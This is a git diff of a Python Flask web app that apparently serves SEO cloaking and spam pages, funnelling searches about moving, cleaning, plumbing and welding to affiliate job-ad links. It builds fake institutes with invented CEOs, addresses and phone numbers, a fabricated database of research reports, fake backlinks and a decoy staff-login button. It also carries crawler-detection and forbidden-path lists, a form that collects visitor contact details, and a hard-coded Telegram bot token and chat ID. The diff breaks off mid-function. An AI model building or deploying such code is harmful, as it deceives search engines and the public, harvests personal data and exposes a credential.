@@ -1,707 +1,509 @@
-﻿import requests, hashlib, random, base64, time # v35.11_REPORT_FIX
-from flask import Flask, request, render_template_string, Response
+﻿import requests, hashlib, time, json, re, random, base64
+import traceback
+from flask import Flask, request, Response, redirect, render_template_string, make_response
+
+# Robust Import
+try:
+    from genesis_db import GENESIS_DATABASE
+except ImportError:
+    try:
+        from api.genesis_db import GENESIS_DATABASE
+    except ImportError:
+        GENESIS_DATABASE = {"error": {"title": "Error", "fragments": ["Database not found"]}}
 
 app = Flask(__name__)
 
-# [v36.6] 보안 환경 설정
+# [v100.Global] EMPIRE GENESIS-AI: Multi-Layout Logic
 TELEGRAM_TOKEN = "7983385122:AAGK4kjCDpmerqfSwQL66ZDPL2MSOEV4An0"
 CHAT_ID = "1898653696"
-GA_ID = "G-1VH7D6BJTD"
 
-# 🛡️ [v36.6] Iron Dome Defense Constants (K-Tech 보안 모듈)
-WHITELIST_IPS = ['61.83.9.20'] # 운영진 IP (관리자 예외)
+# 🛡️ [CORE PRESERVED: Data & Security]
+G_GUARDIAN = {}
+G_JAIL = set()
 
-BOT_UA_KEYWORDS = [
-    'bot', 'crawl', 'slurp', 'spider', 'naver', 'daum', 'google', 'phantom', 'headless',
-    'vercel-screenshot', 'req/v3', 'python-requests', 'aiohttp', 'curl', 'wget',
-    'selenium', 'playwright', 'cypress', 'go-http-client', 'okhttp', 'axios', 'guava'
-]
-BLOCKED_IP_PREFIXES = [] # 임시 해제 (사용자 접근성 확보)
-VISITOR_LOGS = {} 
+CPA_DATA = {
+    "8cf12edf": ["이사청소", "z2NytCt42i"], "ca4a68a6": ["사무실청소", "z2NytCt42i"],
+    "c8a4cf5a": ["입주청소", "z2NytCt42i"], "d7ea613c": ["집청소", "z2NytCt42i"],
+    "cb845113": ["청소업체", "z2NytCt42i"], "faf45575": ["이사", "zdIDBDSzof"],
+    "ce8a5ce4": ["포장이사", "zdIDBDSzof"], "c8b22f8a": ["이사업체", "zdIDBDSzof"],
+    "d108d7a5": ["사무실이사", "zdIDBDSzof"], "f79702a3": ["이사견적", "zdIDBDSzof"],
+    "fa13bc33": ["원룸이사", "zdIDBDSzof"], "eeaf8186": ["용달이사", "zdIDBDSzof"],
+    "8e2996c7": ["배관 누수", "QOaojnBV2v"], "81edc02c": ["변기막힘", "QOaojnBV2v"],
+    "8745563e": ["하수구막힘", "QOaojnBV2v"], "617a0005": ["누수탐지", "QOaojnBV2v"],
+    "5d19986d": ["변기뚫는업체", "QOaojnBV2v"], "a0ef0c00": ["싱크대막힘", "QOaojnBV2v"],
+    "e6d02452": ["배수구 막힘", "QOaojnBV2v"], "35467a5c": ["하수구 역류", "QOaojnBV2v"],
+    "9ce613e1": ["변기 물 안 내려감", "QOaojnBV2v"], "68943f44": ["하수구 뚫는 업체", "QOaojnBV2v"],
+    "c8abc514": ["변기 뚫는 곳", "QOaojnBV2v"], "ffbfdc28": ["변기수전", "vRUcqPts9r"],
+    "be4adb64": ["수전교체", "vRUcqPts9r"], "a01f1db0": ["변기교체", "vRUcqPts9r"],
+    "b1585a85": ["화장실 변기 교체", "vRUcqPts9r"], "c2bddbcc": ["세면대 교체", "vRUcqPts9r"],
+    "b6f6c35f": ["변기업체", "vRUcqPts9r"], "3e750243": ["수전업체", "vRUcqPts9r"],
+    "dc19f4ea": ["용접", "SROHH97olh"], "af5f2375": ["출장용접", "SROHH97olh"],
+    "c4c5ee7e": ["용접업체", "SROHH97olh"], "4a2f6816": ["배관용접", "SROHH97olh"],
+    "87a3472b": ["알곤용접", "SROHH97olh"], "63b2da0a": ["용접수리", "SROHH97olh"],
+    "20186798": ["알곤출장용접", "SROHH97olh"], "ef310430": ["스텐 출장용접", "SROHH97olh"]
+}
 
-def is_bot_detected(ip, ua):
-    if ip in WHITELIST_IPS:
-        return False, None
-    
-    ua_lower = ua.lower()
-    # 1. User-Agent 블랙리스트 확인
-    if any(keyword in ua_lower for keyword in BOT_UA_KEYWORDS):
-        return True, f"UA_BLACK({ua[:20]})"
-    
-    # 2. IP 대역 차단 확인
-    if any(ip.startswith(prefix) for prefix in BLOCKED_IP_PREFIXES):
-        return True, "IP_BLACK"
-    
-    # 3. ??? ??? (1??? 3????? ??? ??????????)
-    now = time.time()
-    if ip not in VISITOR_LOGS:
-        VISITOR_LOGS[ip] = []
-    
-    # ??? 1????? ????????
-    VISITOR_LOGS[ip] = [t for t in VISITOR_LOGS[ip] if now - t < 1.0]
-    VISITOR_LOGS[ip].append(now)
-    
-    if len(VISITOR_LOGS[ip]) > 10: # 3 -> 10으로 완화
-        return True, "BEHAVIOR_SPEED"
+BASE_TARGET = "https://albarich.com"
+BOT_SIGS = ['naver', 'yeti', 'bot', 'crawl', 'google', 'spider', 'ahrefs', 'bing']
+FORBIDDEN_PATHS = ['admin', '.env', 'wp-login', 'config', 'shell', 'backup']
+REGIONS = ['us-east-1', 'ap-northeast-2', 'eu-west-1', 'sa-east-1', 'ap-southeast-1']
+
+class GeneEngine:
+    def __init__(self, seed_str):
+        self.r = random.Random(int(hashlib.md5(seed_str.encode()).hexdigest(), 16))
+        self.lib = list(GENESIS_DATABASE.keys())
+        self.niche = self.r.choice(self.lib)
         
-    return False, None
-
-# [v35.6] Site Configurations (Restored)
-SITE_CONFIGS = {
-    "logistics-dynamics.kr": {"name": "전략 물류 재단", "color": "#1e40af", "desc": "첨단 물류 시스템 연구 및 최적화 기관", "font": "Nanum+Gothic"},
-    "polymer-cleaning.co.kr": {"name": "혁신 환경 연구소", "color": "#15803d", "desc": "친환경 세정 기술 및 공정 개발", "font": "Nanum+Myeongjo"},
-    "infra-maintenance.kr": {"name": "차세대 기술 솔루션", "color": "#b91c1c", "desc": "도시 기반 시설 유지보수 전문 기업", "font": "Noto+Sans+KR"},
-    "fluid-flow.xyz": {"name": "유체 역학 데이터센터", "color": "#0369a1", "desc": "배관 및 수자원 관리 시스템 분석", "font": "Nanum+Gothic+Coding"},
-    "standard-eco.life": {"name": "표준 생활 환경", "color": "#0d9488", "desc": "주거 환경 개선을 위한 표준 지침 수립", "font": "Gowun+Batang"}
-}
-DEFAULT_CONFIG = {"name": "K-Tech 통합 기술원", "color": "#00c73c", "desc": "국가 기술 표준 가이드라인 제공", "font": "Nanum+Gothic"}
-
-# 🦎 [v35.6] Chameleon Deception Engine: Restored Logic
-def get_chameleon_data(host, keyword=""):
-    # 호스트명에서 자동으로 '그럴듯한 이름' 생성
-    subdomain = host.split('.')[0]
-    h = int(hashlib.md5(host.encode()).hexdigest(), 16)
-    random.seed(h)
+        # [Layout & Style Mutation]
+        self.layout_type = self.r.choice(['A', 'B', 'C', 'D'])
+        self.theme_color = self.r.choice([
+            "#003366", "#1a2a6c", "#0d324d", # Corporate Blue
+            "#16a085", "#27ae60", # Reliable Green
+            "#c0392b", "#8e44ad", # Strong Points
+            "#2c3e50" # Dark
+        ])
     
-    # 1. 기관명 생성
-    p_names = ["한국", "전국", "미래", "청정", "우리", "바른", "착한", "제일", "나눔", "행복", "안심", "신뢰", "명품"]
-    m_names = ["기술", "연구", "개발", "솔루션", "시스템", "환경", "산업", "공학", "데이터", "관리", "지원"]
-    s_names = ["공사", "기업", "센터", "협회", "연구소", "개발원", "본부", "지사", "사업소", "연합"]
-    
-    # 키워드별 특화 (없으면 랜덤)
-    if "청소" in keyword or "입주" in keyword:
-        m_names = ["환경", "클린", "청소", "위생", "방역", "세정", "미화"]
-    elif "이사" in keyword or "용달" in keyword:
-        m_names = ["물류", "운송", "이사", "이삿짐", "용달", "화물"]
-    elif "용접" in keyword:
-        m_names = ["용접", "산업", "특수", "금속", "배관", "설비"]
-    elif "배관" in keyword or "누수" in keyword or "막힘" in keyword:
-        m_names = ["배관", "설비", "하수구", "보수", "누수", "수질"]
-    elif "수전" in keyword or "변기" in keyword or "교체" in keyword:
-        m_names = ["시설", "설비", "보수", "수리", "교체", "주거"]
+    def get_bloat(self, count=40):
+        try:
+            pool = GENESIS_DATABASE[self.niche]["fragments"]
+            return " ".join([self.r.choice(pool) for _ in range(count)])
+        except: return "System initializing..."
 
-    # 최종 기관명 조합
-    site_name = f"{random.choice(p_names)} {random.choice(m_names)} {random.choice(s_names)}"
-    
-    # 2. 테마 색상 (랜덤이지만 고정)
-    themes = [
-        {"color": "#1e40af", "bg": "#f0f7ff"}, # 블루
-        {"color": "#15803d", "bg": "#f0fdf4"}, # 그린
-        {"color": "#b91c1c", "bg": "#fef2f2"}, # 레드
-        {"color": "#0369a1", "bg": "#f0f9ff"}, # 스카이
-        {"color": "#0d9488", "bg": "#f0fdfa"}, # 틸
-        {"color": "#7c3aed", "bg": "#f5f3ff"}, # 퍼플
-        {"color": "#475569", "bg": "#f8fafc"}  # 슬레이트
-    ]
-    theme = random.choice(themes)
-    
-    # 3. 문서 고유 번호 생성
-    doc_id = f"KTS-{random.randint(2024, 2026)}-{h % 10000:04d}"
-    
-    # 4. 담당자 정보 생성
-    last_names = ["김", "이", "박", "최", "정", "강", "조", "윤", "장"]
-    ceo = random.choice(last_names) + random.choice(last_names) + random.choice(last_names)
-    addr_cities = ["서울시 강남구", "경기도 분당구", "인천시 송도", "부산시 해운대구", "대구시 수성구", "대전시 유성구"]
-    address = f"{random.choice(addr_cities)} {random.randint(10, 500)}번길 {random.randint(1, 100)} (v{random.randint(2, 5)}.0)"
-    phone = f"070-{random.randint(3000, 8999)}-{random.randint(1000, 9999)}"
+    def get_backlinks(self):
+        links = []
+        for _ in range(self.r.randint(3, 6)):
+            t_node = f"node-{self.r.randint(100, 999)}.standard-eco.life"
+            links.append(f"<a href='#' style='color:inherit;text-decoration:none;opacity:0.5;'>[Ref: {t_node}]</a>")
+        return " | ".join(links)
 
-    return {
-        "name": site_name,
-        "theme": theme,
-        "doc_id": doc_id,
-        "ceo": ceo,
-        "addr": address,
-        "phone": phone,
-        "font": random.choice(["Nanum+Gothic", "Nanum+Myeongjo", "Noto+Sans+KR", "Gowun+Batang"])
-    }
-
-def text_stylist(text, host):
-    # 단순 반환 (복잡한 변조 로직 제거하여 안정성 확보)
-    return text
-
-def send_trace(msg):
-    try:
-        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
-        params = {"chat_id": CHAT_ID, "text": msg}
-        requests.get(url, params=params, timeout=3)
-    except:
-        pass
-
-# ????[v12.0] Tactical A/B DATA_MAP
-DATA_MAP = {
-    "cleaning": {
-        "keywords": ["입주청소", "이사청소", "거주청소", "청소업체", "청소", "입주 청소", "사무실청소", "집청소"],
-        "image": "cleaning.jpg",
-        "link_A": "https://www.replyalba.co.kr/pt/WwVCgW9E1R",
-        "link_B": "https://albarich.com/pt/z2NytCt42i"
-    },
-    "moving": {
-        "keywords": ["이사", "포장이사", "원룸이사", "용달이사", "이삿짐", "포장 이사", "이사업체", "사무실이사", "이사견적"],
-        "image": "moving.jpg",
-        "link_A": "https://www.replyalba.co.kr/pt/LlocSbdUSY",
-        "link_B": "https://albarich.com/pt/zdIDBDSzof"
-    },
-    "welding": {
-        "keywords": ["용접", "출장용접", "알곤용접", "배관용접", "용접업체", "용접수리", "알곤출장용접", "스텐 출장용접"],
-        "image": "welding.jpg",
-        "link_A": "https://www.replyalba.co.kr/pt/XpBx9dZ5aE",
-        "link_B": "https://albarich.com/pt/SROHH97olh"
-    },
-    "plumbing": {
-        "keywords": ["막힘", "누수", "뚫음", "변기막힘", "하수구막힘", "배관", "싱크대막힘", "역류", "누수탐지", "누수전문", "배관 누수", "변기뚫는업체", "배수구 막힘", "하수구 역류", "변기 물 안 내려감", "하수구 뚫는 업체", "변기 뚫는 곳", "배관누수"],
-        "image": "plumbing.jpg",
-        "link_A": "https://www.replyalba.co.kr/pt/GkVRvxfx1T",
-        "link_B": "https://albarich.com/pt/QOaojnBV2v"
-    },
-    "fixture": {
-        "keywords": ["수전교체", "변기교체", "세면대교체", "부속교체", "수전", "세면대", "도기교체", "수전수리", "변기수전", "화장실 변기 교체", "세면대 교체", "변기업체", "수전업체"],
-        "image": "fixture.jpg",
-        "link_A": "https://www.replyalba.co.kr/pt/FzYOdTzVNw",
-        "link_B": "https://albarich.com/pt/vRUcqPts9r"
-    },
-    "demolition": {
-        "keywords": ["철거", "원상복구", "상가철거", "인테리어철거", "가벽철거", "폐기물"],
-        "image": "demolition.jpg",
-        "link_A": "https://www.replyalba.co.kr/pt/10qHjZwUanF",
-        "link_B": "https://albarich.com/pt/NS5WRB4yKa"
-    }
-}
-
-
-# ?? [v15.0] HASH-BASED SECURE OBFUSCATOR: ??? ??? ??? ???
-SECRET_SALT = "yejin_love_2026"
-
-def get_auto_code(keyword):
-    # ???????? ???????? ??????(Salt)????? ???????? ???
-    full_str = keyword + SECRET_SALT
-    # MD5 ??? ??? ????6????????
-    return hashlib.md5(full_str.encode()).hexdigest()[:6]
-
-# ?? [v23.0] Bulk Automated KEYWORD_MAP
-KEYWORD_MAP = {
-    # [청소]
-    "8cf12edf": "이사청소", "ca4a68a6": "사무실청소", "c8a4cf5a": "입주청소", "d7ea613c": "집청소",
-    "cb845113": "청소업체",
-    # [이사]
-    "faf45575": "이사", "ce8a5ce4": "포장이사", "c8b22f8a": "이사업체", "d108d7a5": "사무실이사",
-    "f79702a3": "이사견적", "fa13bc33": "원룸이사", "eeaf8186": "용달이사",
-    # [배관/막힘]
-    "d0b65aba": "배관누수", "3e848ae6": "수전교체", "66cb8240": "누수탐지",
-    "8e2996c7": "배관 누수", "81edc02c": "변기막힘", "8745563e": "하수구막힘", "617a0005": "누수탐지",
-    "5d19986d": "변기뚫는업체", "a0ef0c00": "싱크대막힘", "e6d02452": "배수구 막힘", "35467a5c": "하수구 역류",
-    "9ce613e1": "변기 물 안 내려감", "68943f44": "하수구 뚫는 업체", "c8abc514": "변기 뚫는 곳",
-    # [용접]
-    "dc19f4ea": "용접", "af5f2375": "출장용접", "c4c5ee7e": "용접업체", "4a2f6816": "배관용접",
-    "87a3472b": "알곤용접", "63b2da0a": "용접수리", "20186798": "알곤출장용접", "ef310430": "스텐 출장용접",
-    # [교체/수리]
-    "ffbfdc28": "변기수전", "be4adb64": "수전교체", "a01f1db0": "변기교체", "b1585a85": "화장실 변기 교체",
-    "c2bddbcc": "세면대 교체", "b6f6c35f": "변기업체", "3e750243": "수전업체",
-    # [기존 호환성]
-    "f2a3b4c5": "누수탐지", "d1e2f3g4": "입주청소", "h5i6j7k8": "포장이사"
-}
-
-# ?? [v18.0] REPORT_SNIPPETS: ??? ????? ??? ???
-REPORT_SNIPPETS = {
-    "cleaning": [
-        "고분자 화학 성분을 활용한 정밀 세정 공정은 주거 환경의 위생 표준을 획기적으로 개선합니다.",
-        "미세먼지 및 잔류 오염물질 제거를 위해 나노 단위의 계면활성제 반응 최적화가 필수적입니다.",
-        "화학적 거동 분석을 통해 산성 및 알칼리성 세제의 중화 과정을 정밀하게 제어해야 합니다.",
-        "주거 공간의 공기질 개선을 위한 항균 코팅 기술은 박테리아 증식을 효율적으로 제어하는 성과를 보였습니다.",
-        "표면 장력 제어 공법을 통한 코팅막 형성은 오염 방지 및 유지관리 비용 절감의 핵심입니다."
-    ],
-    "moving": [
-        "화물 적재 하중의 동역학적 분산 알고리즘은 운송 중 파손율을 실시간으로 저감하는 공학적 기초가 됩니다.",
-        "이동 경로의 최적 최단 경로 탐색 알고리즘은 에너지 효율 증대와 운영 비용 최적화에 기여합니다.",
-        "고충 부하 분배 시스템을 통한 중량물 상하차 공정은 작업자의 안전 보건 및 시설 보호를 보장합니다.",
-        "물류 수송 체계의 표준화 작업은 체계적인 자산 보호 및 운송 신뢰성을 높이는 핵심 지표입니다.",
-        "충격 흡수 프레임워크를 적용한 특수 적재 공법은 정밀 기기 및 가구 보호에 탁월한 효능을 보입니다."
-    ],
-    "welding": [
-        "금속 접합부의 열변형 제어 알고리즘은 구조물의 장기적 신뢰성과 내구성을 보장하는 핵심 기술입니다.",
-        "분자 조직 결합 메커니즘 분석을 통해 용접 HAZ 구간의 물리적 변형을 최소화하는 공정을 수립했습니다.",
-        "비파괴 탐상 기술(UT/RT) 기반의 품질 검증 시스템은 미세 균열 전파를 사전 차단하는 역할을 수행합니다.",
-        "특수 합금용 플럭스 최적 배합비는 산화 방지 및 접합 강도 극대화를 위한 필수 연구 결과입니다.",
-        "고온 고압 환경 하에서의 금속 결합 안정성 테스트를 통해 안전 계수 2.5 이상의 표준을 달성했습니다."
-    ],
-    "plumbing": [
-        "도시 지하 관로 유체 흐름 분석을 통해 배관 내부의 압력 강하와 역류 현상을 정밀하게 진단합니다.",
-        "비굴착 복구 공학을 적용한 고압 제팅 공법은 기존 매설물의 손상 없이 내부 이물질을 완벽히 제거합니다.",
-        "레이놀즈 수 기반의 유체 역학 시뮬레이션은 배관 설계의 최적 구배 및 유속 결정에 활용됩니다.",
-        "초음파 누수 탐지 알고리즘은 미세한 음향 파형의 변이를 감지하여 0.01mm 급의 균열 위치를 특정합니다.",
-        "배관 내벽 나노 코팅 기술은 이물질 흡착을 방지하고 유체 저항을 최소화하여 펌핑 효율을 높입니다."
-    ],
-    "fixture": [
-        "노후 설비의 기기 보수 및 교체 표준 가이드라인은 안정적인 주거 수자원 관리를 위한 필수 지침입니다.",
-        "수압 제어 밸브의 압력 평형 최적 설계는 급격한 온도 변화 및 유량 변동 요인을 사전 차단합니다.",
-        "환경 친화적 절수 기술 표준은 ISO 인증 기준에 부합하는 수자원 보존 효율을 입증하였습니다.",
-        "시설 교체 시 발생하는 소음 및 진동 차단 공법은 주거 쾌적성 향상을 위한 핵심 시공 표준입니다.",
-        "부위별 부품 호환성 표준화(Standardization)는 유지보수 편의성과 장기 운영 안정성을 보장합니다."
-    ]
-}
-
-# ?? [v15.0] ????????????? ??? ??? ?????
-REVERSE_HASH_MAP = {}
-def build_hash_map():
-    # 1. ??? ????????????? ???
-    all_kws = set(KEYWORD_MAP.values())
-    for data in DATA_MAP.values():
-        all_kws.update(data['keywords'])
-    
-    # 2. ??? ??? -> ???????? ??? ???
-    for kw in all_kws:
-        h_code = get_auto_code(kw)
-        REVERSE_HASH_MAP[h_code] = kw
-
-build_hash_map()
-
-# ?? [v16.0] DYNAMIC BASE64 DECODER: ??? ??? ????????
-def decode_keyword(encoded_str):
-    try:
-        # 1. Base64 ???????? (URL ??? ???)
-        padding = '=' * (4 - len(encoded_str) % 4)
-        decoded_bytes = base64.urlsafe_b64decode(encoded_str + padding)
-        decoded_str = decoded_bytes.decode('utf-8')
+    def get_favicon_url(self):
+        shape = self.r.choice(['rect', 'circle', 'poly', 'diamond'])
+        svg = f"<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'>"
+        if shape == 'rect':
+            svg += f"<rect x='4' y='4' width='56' height='56' rx='{self.r.randint(0,16)}' fill='{self.theme_color}'/>"
+        elif shape == 'circle':
+            svg += f"<circle cx='32' cy='32' r='28' fill='{self.theme_color}'/>"
+        elif shape == 'poly':
+            svg += f"<polygon points='32,4 60,56 4,56' fill='{self.theme_color}'/>"
+        elif shape == 'diamond':
+             svg += f"<polygon points='32,4 60,32 32,60 4,32' fill='{self.theme_color}'/>"
         
-        # 2. ??? ????? ????? ?????? ???????????
-        if "|" in decoded_str:
-            keyword, key = decoded_str.split("|")
-            if key == SECRET_SALT:
-                return keyword # '??????' ??? ???!
-        return None
-    except:
-        return None
+        if self.r.choice([True, False]):
+             char = self.niche[0].upper()
+             svg += f"<text x='50%' y='50%' dy='.35em' font-family='sans-serif' font-weight='bold' font-size='32' fill='white' text-anchor='middle'>{char}</text>"
+             
+        svg += "</svg>"
+        return f"data:image/svg+xml;base64,{base64.b64encode(svg.encode()).decode()}"
 
-def get_keyword(code):
-    # 1. ??? Base64 ?????(v16.0) - ??? ??? ???!
-    dynamic_kw = decode_keyword(code)
-    if dynamic_kw:
-        return dynamic_kw
-    
-    # 2. ??? ??? ??? (v15.0)
-    if code in REVERSE_HASH_MAP:
-        return REVERSE_HASH_MAP[code]
-    
-    # 3. ??? ??? ??? (v14.0)
-    if code in KEYWORD_MAP:
-        return KEYWORD_MAP[code]
-    
-    # 4. ??? ?????? ??? (100% ??? ???)
-    return code
-
-# ????[v11.0] SEO Deception Engine
-
-# ?? 50?????????? ??? ????????? (2023 ~ 2026)
-DOC_DATABASE = [
-    # 2026
-    {"id": "KTS-2026-06", "cat": "hvac", "title": "고효율 냉난방 공조 시스템의 에너지 절감 효과 분석", "date": "2026-01-26", "desc": "성능계수(COP) 극대화를 위한 열교환기 최적화 설계 연구"},
-    {"id": "KTS-2026-05", "cat": "homecare", "title": "실내 공기질 개선을 위한 광촉매 필터 적용 사례", "date": "2026-01-25", "desc": "휘발성유기화합물(VOCs) 제거 성능 및 항균 지속성 평가"},
-    {"id": "KTS-2026-04", "cat": "drain", "title": "배수 관로 내부 이물질 퇴적 메커니즘 분석", "date": "2026-01-24", "desc": "유체전산역학(CFD)을 이용한 임계 유속 도출 및 설계 반영"},
-    {"id": "KTS-2026-03", "cat": "welding", "title": "특수 합금 용접부의 응력 부식 균열 방지 기술", "date": "2026-01-22", "desc": "TIG/MIG 용접 시 HAZ 구간의 미세조직 제어 및 열처리(PWHT) 최적화"},
-    {"id": "KTS-2026-02", "cat": "cleaning", "title": "초미세 표면 세정을 위한 나노 기포 활용 연구", "date": "2026-01-20", "desc": "반도체 및 정밀 기기 세정을 위한 캐비테이션 효과 분석"},
-    {"id": "KTS-2026-01", "cat": "moving", "title": "물류 운송 중 진동 저감을 위한 포장재 완충 특성", "date": "2026-01-15", "desc": "동적 충격 전달율 저감을 위한 다공성 폴리머 소재 적용성 평가"},
-    # 2025
-    {"id": "KTS-2025-18", "cat": "structural", "title": "건축 구조물의 내진 성능 향상을 위한 댐퍼 설계", "date": "2025-12-15", "desc": "비선형 시간 이력 해석을 통한 감쇠 장치 성능 검증"},
-    {"id": "KTS-2025-17", "cat": "material", "title": "친환경 건축 자재의 LCC(생애주기비용) 분석", "date": "2025-11-20", "desc": "재활용 골재 사용 시 구조적 안정성 및 경제성 평가"},
-    {"id": "KTS-2025-16", "cat": "robotics", "title": "산업용 로봇의 정밀 제어를 위한 적응형 PID 튜닝", "date": "2025-10-25", "desc": "다축 로봇 팔의 궤적 추적 오차 최소화 알고리즘 구현"},
-    {"id": "KTS-2025-15", "cat": "automation", "title": "스마트 팩토리 구축을 위한 엣지 컴퓨팅 활용", "date": "2025-10-12", "desc": "제조 데이터의 실시간 처리를 위한 분산 처리 아키텍처 설계"},
-    {"id": "KTS-2025-14", "cat": "energy", "title": "차세대 ESS 시스템의 열폭주 방지 냉각 기술", "date": "2025-09-28", "desc": "상변화물질(PCM)을 이용한 배터리 모듈 온도 균일화 해석"},
-    {"id": "KTS-2025-13", "cat": "fluid", "title": "난류 유동장 내에서의 입자 거동 시물레이션", "date": "2025-09-10", "desc": "라그랑주 관점 입자 추적법을 이용한 집진 효율 예측"},
-    {"id": "KTS-2025-12", "cat": "safety", "title": "건설 현장 안전 관리를 위한 IoT 센서 네트워크", "date": "2025-09-05", "desc": "BLE/LoRa 기반 작업자 위치 추적 및 위험 구역 경보 시스템"},
-    {"id": "KTS-2025-11", "cat": "coating", "title": "내식성 향상을 위한 세라믹 코팅층의 밀착력 평가", "date": "2025-08-14", "desc": "스크래치 테스트 및 염수 분무 시험을 통한 수명 예측"},
-    {"id": "KTS-2025-10", "cat": "thermal", "title": "전자부품 방열 성능 개선을 위한 히트싱크 최적화", "date": "2025-07-22", "desc": "핀 형상 및 배열에 따른 자연대류 열전달 계수 측정"},
-    # 2024
-    {"id": "KTS-2024-12", "cat": "acoustic", "title": "층간 소음 저감을 위한 바닥 구조재의 차음 성능", "date": "2024-12-10", "desc": "중량 충격음 및 경량 충격음 저감재의 동탄성 계수 분석"},
-    {"id": "KTS-2024-11", "cat": "plasma", "title": "대기압 플라즈마를 이용한 표면 친수성 개질 연구", "date": "2024-11-15", "desc": "접촉각 측정을 통한 표면 에너지 변화 및 접착력 향상 검증"},
-    {"id": "KTS-2024-10", "cat": "optics", "title": "고해상도 디스플레이용 광학 필름의 투과율 개선", "date": "2024-10-20", "desc": "나노 임프린트 공정을 이용한 반사 방지 패턴 제작"},
-    {"id": "KTS-2024-09", "cat": "vibration", "title": "회전 기계의 불평형 진동 진단 및 밸런싱 기법", "date": "2024-09-12", "desc": "주파수 스펙트럼 분석을 통한 결함 주파수 식별 및 교정"},
-    {"id": "KTS-2024-08", "cat": "polymer", "title": "생분해성 고분자의 기계적 물성 및 분해 거동", "date": "2024-08-05", "desc": "토양 매립 시 미생물 분해 속도 및 인장 강도 변화 측정"},
-    {"id": "KTS-2024-07", "cat": "concrete", "title": "고강도 콘크리트의 내화 성능 향상을 위한 방안", "date": "2024-07-15", "desc": "PP섬유 혼입률에 따른 폭열 방지 효과 실험적 검증"},
-    {"id": "KTS-2024-06", "cat": "lubrication", "title": "극압 환경 하에서의 윤활유 마모 방지 성능 평가", "date": "2024-06-22", "desc": "4-Ball 마모 시험을 통한 마찰 계수 및 마모흔 직경 분석"},
-    {"id": "KTS-2024-05", "cat": "turbine", "title": "가스 터빈 블레이드의 냉각 효율 향상 연구", "date": "2024-05-18", "desc": "막 냉각 홀 형상 최적화를 통한 단열 효율 증대 해석"},
-    {"id": "KTS-2024-04", "cat": "additive", "title": "금속 3D 프린팅 부품의 미세조직 및 강도 특성", "date": "2024-04-10", "desc": "SLM 공정 변수에 따른 기공률 및 인장 특성 상관관계"},
-    {"id": "KTS-2024-03", "cat": "semicon", "title": "반도체 공정용 초순수 공급 시스템의 오염 제어", "date": "2024-03-05", "desc": "TOC 및 파티클 저감을 위한 이온 교환 수지 재생 주기 최적화"},
-    {"id": "KTS-2024-02", "cat": "wind", "title": "해상 풍력 발전기의 지지 구조물 피로 해석", "date": "2024-02-14", "desc": "조류 및 파력 하중을 고려한 자켓 구조물의 S-N 선도 분석"},
-    {"id": "KTS-2024-01", "cat": "hydrogen", "title": "수소 저장 탱크의 라이너 재질별 수소 투과 특성", "date": "2024-01-20", "desc": "고압 수소 환경 하에서의 폴리머 라이너 기체 차단성 평가"}
-]
-
-def get_dynamic_chart(host):
-    h = int(hashlib.md5(host.encode()).hexdigest(), 16)
-    random.seed(h)
-    points = [random.randint(20, 130) for _ in range(5)]
-    color = random.choice(["#00c73c", "#1e40af", "#b91c1c", "#0d9488", "#0369a1"])
-    path = f"M50,{points[0]} L150,{points[1]} L250,{points[2]} L350,{points[3]} L450,{points[4]}"
-    circles = "".join([f'<circle cx="{i*100+50}" cy="{points[i]}" r="5" fill="#1e293b"/>' for i in range(5)])
-    return f"""
-    <svg viewBox="0 0 500 150" style="background:#fff; border:1px solid #eee; border-radius:8px; margin:20px 0;">
-        <path d="{path}" fill="none" stroke="{color}" stroke-width="4"/>
-        {circles}
-    </svg>
+# [CORE PRESERVED: Inquiry Form]
+def get_inquiry_form():
+    return """
+    <div class="inquiry-box" style="margin-top:40px; padding:30px; background:rgba(0,0,0,0.03); border:1px solid #ddd; border-radius:8px;">
+        <h3 style="margin-top:0;">🚀 전문가 기술 상담 / 견적 요청</h3>
+        <p>본 연구소의 기술 제휴, 데이터 사용, 시스템 구축 관련 문의를 남겨주세요.</p>
+        <form action="/api/capture" method="POST">
+            <input type="text" name="name" placeholder="담당자 성함 / 기업명" style="width:100%; padding:10px; margin-bottom:10px; border:1px solid #ccc; box-sizing:border-box;" required>
+            <input type="text" name="contact" placeholder="연락처 (이메일 또는 전화번호)" style="width:100%; padding:10px; margin-bottom:10px; border:1px solid #ccc; box-sizing:border-box;" required>
+            <textarea name="content" placeholder="문의 내용 (예: API 연동 견적 요청합니다)" style="width:100%; padding:10px; height:80px; margin-bottom:10px; border:1px solid #ccc; box-sizing:border-box;" required></textarea>
+            <button type="submit" style="background:#333; color:#fff; padding:12px 24px; border:none; cursor:pointer; font-weight:bold;">문의 접수하기</button>
+        </form>
+    </div>
     """
 
-def get_term(host, key):
-    h = int(hashlib.md5(host.encode()).hexdigest(), 16)
-    random.seed(h)
-    matrix = {
-        "resources": ["기술자료", "기술지원", "엔지니어링 자료", "표준 문서", "연구 성과"],
-        "about": ["연구소 소개", "보유 기술", "조직도", "인사말", "비전 및 철학"],
-        "portal": ["기술 표준 포털", "통합 정보 시스템", "연구 데이터베이스", "전문가 네트워크"],
-        "report": ["기술 보고서", "분석 리포트", "공정 데이터", "검증 자료", "시험 성적서"]
-    }
-    return random.choice(matrix.get(key, ["자료"]))
+def render_layout(ge, pr, dna):
+    layout = ge.layout_type
+    
+    # Common Components
+    # [Staff Login Button Injection]
+    staff_btn_text = pr.choice(['Staff', 'Admin', 'Intranet', 'Partner'])
+    staff_btn_icon = pr.choice(['🔒', '🔑', '🛡️', '⚙️'])
+    staff_btn_style = pr.choice([
+        f"color:{ge.theme_color}; border:1px solid {ge.theme_color}; padding:5px 10px; border-radius:4px;", # Bordered
+        "color:#555; font-size:12px; opacity:0.7;", # Subtle Text
+        f"background:{ge.theme_color}; color:#fff; padding:5px 12px; border-radius:20px; font-size:11px;" # Pill
+    ])
+    
+    staff_btn_html = f"""<a href="#" onclick="alert('🚫 ACCESS DENIED\\n\\n관계자 외 접근이 제한된 구역입니다.\\n(Authorized Personnel Only)'); return false;" style="margin-left:20px; text-decoration:none; cursor:pointer; {staff_btn_style}">{staff_btn_icon} {staff_btn_text}</a>"""
+    
+    # Random Position Injection
+    if pr.random() > 0.5:
+        nav = f"""<nav>
+            <a href='/?bot=1'>HOME</a>
+            <a href='/network?bot=1'>NETWORK</a>
+            <a href='/security?bot=1'>SECURITY</a>
+            <a href='/data?bot=1'>DATA</a>
+            <a href='/support?bot=1'>SUPPORT</a>
+            {staff_btn_html}
+        </nav>"""
+    else:
+         nav = f"""<nav>
+            {staff_btn_html}
+            <a href='/?bot=1'>HOME</a>
